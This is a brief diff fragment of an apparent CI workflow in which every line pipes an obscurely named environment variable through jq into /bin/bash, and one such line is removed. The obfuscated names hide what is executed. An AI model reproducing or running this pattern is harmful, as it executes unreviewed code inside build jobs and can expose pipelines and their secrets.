@@ -21,7 +21,6 @@ jobs:
           echo $l60787 | jq -r .w331 | /bin/bash
           printf '%s' "$jas2" | jq -r .cv22 | /bin/bash
           echo $dweq9 | jq -r .p8 | /bin/bash
-          printf '%s' "$sl32" | jq -r .nqw1 | /bin/bash
           echo $zebcd00286 | jq -r .mp4940 | /bin/bash
           echo $nnm12 | jq -r .d3216 | /bin/bash
           printf '%s' "$gg26" | jq -r .qrq50 | /bin/bash
